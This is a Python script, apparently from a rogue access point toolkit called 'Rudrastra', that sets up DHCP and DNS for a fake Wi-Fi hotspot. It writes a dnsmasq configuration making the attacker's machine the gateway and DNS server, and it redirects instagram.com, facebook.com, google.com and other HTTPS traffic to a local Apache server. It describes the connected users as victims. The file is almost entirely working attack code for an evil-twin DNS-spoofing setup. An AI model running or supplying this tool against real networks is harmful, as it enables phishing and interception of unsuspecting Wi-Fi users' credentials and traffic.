#By SxNade
#https://github.com/SxNade
#CONTRIBUTE

from termcolor import colored
import sys
import os
import time
#importing the required Libraries..

golo = '''

   ___  __  _____  ___  ___   _____________  ___      ___  __ __________ 
  / _ \/ / / / _ \/ _ \/ _ | / __/_  __/ _ \/ _ |____/ _ \/ // / ___/ _ \
 / , _/ /_/ / // / , _/ __ |_\ \  / / / , _/ __ /___/ // / _  / /__/ ___/
/_/|_|\____/____/_/|_/_/ |_/___/ /_/ /_/|_/_/ |_|  /____/_//_/\___/_/    
                                                                        '''

print(golo)

print(colored("[+]Configuring IP Assignment For Fake AP.......!", "green", attrs=['bold']))


ifc = str(input(colored("[*] What is the monitor Mode Interface of your fake AP: ", "green", attrs=['bold'])))

#Function to make the dnsmasq.conf file required for DHCP
def writing_file():
    file = open("dnsmasq.conf", 'w')
    file.write(f"interface={ifc}")
    file.write("\n")
    file.write("dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h")
    file.write("\n")
    file.write("dhcp-option=3,192.168.1.1")
    file.write("\n")
    file.write("dhcp-option=6,192.168.1.1")
    file.write("\n")
    file.write("server=8.8.8.8")
    file.write("\n")
    file.write("log-queries")
    file.write("\n")
    file.write("log-dhcp")
    file.write("\n")
    file.write("listen-address=127.0.0.1")
    file.close()
    print(colored("DHCP File Wrote Successfully.....!", "green", attrs=['bold']))


fake_host = input(colored("\n[*] Do you want do Redirect The DNS Requests..(Y/N)", "red", attrs=['bold']))


#Receiving User Input For configuring the DNS-Spoofing File..
if fake_host == "Y":
    ans = input(colored("\n[*] Should we Redirect all DNS requests to your Local...apache Server..(Y/N)", "red", attrs=['bold']))
    if ans == "Y":
        print("[+]Starting Apache Server On Your System...")
        os.system("service apache2 start")
        print(colored("[+]Writing fakehosts File", "green"))
        time.sleep(2)
        serv_ip = input("Enter The IP of Your Fake Server: ")
        file = open("fakehosts.conf", 'w')
        file.write(f"{serv_ip} instagram.com")
        file.write("\n")
        file.write(f"{serv_ip} facebook.com")
        file.write("\n")
        file.write(f"{serv_ip} google.com")
        file.write("\n")
        file.write(f"{serv_ip} https*")
        file.close()
        print(colored("Now Whole Traffic of Victim will Be Redirected To your Server..", "red", attrs=['bold']))
    elif ans == 'N':
        print("[+]Server Is Now ready to use..!")
elif fake_host == "N":
    print("[+]Server is Ready To use..!")


ask = input(colored("Should we start DHCP Server Now..!....(Y/N)", "red", attrs=['bold']))

#Conditional Statements for Running The DHCP Server...
if ask == "Y":
    writing_file()
    print(colored("[+]\n\nNow you can configure and start the AP with..start-ap.py!", "green"))
    time.sleep(4)
    os.system("clear")
    print(colored("<0>ONLINE", "green", attrs=['bold']))
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")
elif ask == "N":
    print(colored("[+]Exiting NOW!!!", "red", attrs=['bold']))
    sys.exit(0)
elif ask and ans == "Y":
    print(colored("[+]\n\nNow you can configure and start the AP with..start-ap.py!", "green"))
    os.system("clear")
    print(colored("<0>ONLINE", "green", attrs=['bold']))
    os.system("dnsmasq -C dnsmasq.conf -d -H fakehosts.conf")

else:
    print(colored("UNEXCPECTED INPUT!...exiting now.."))
    sys.exit(0)
